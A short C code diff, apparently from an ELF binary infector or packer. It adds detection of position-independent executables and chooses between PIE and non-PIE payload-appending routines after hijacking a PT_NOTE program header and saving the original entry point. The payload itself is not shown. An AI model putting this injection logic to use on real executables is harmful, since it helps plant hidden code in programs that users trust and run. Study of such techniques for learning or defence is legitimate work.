@@ -4,6 +4,14 @@ bool handle_file(t_file *file) {
     Elf64_Ehdr *eHdr = (Elf64_Ehdr *)file->ptr;
     Elf64_Phdr *pHdr;
     uint64_t og_entry =  eHdr->e_entry;
+    if (eHdr->e_type == ET_EXEC) {
+        puts("No PIE detected");
+        file->pie = false;
+    }
+    else {
+        puts("PIE detected");
+        file->pie = true;
+    }
     // print_ehdr(eHdr);
     // print_all_phdr(file, eHdr);
     printf("ENTRY POINT = 0x%08lx\n", eHdr->e_entry);
@@ -17,8 +25,12 @@ bool handle_file(t_file *file) {
     puts("Found PT_NOTE pHdr");
     // print_phdr(pHdr);
     hijack_phdr(file, eHdr, pHdr);
-
-    append_payload(file, og_entry);
+    if (file->pie == false) {
+        append_payload_no_pie(file, og_entry);
+    }
+    else {
+        append_payload_pie(file, og_entry);
+    }
     return false;
 }
 
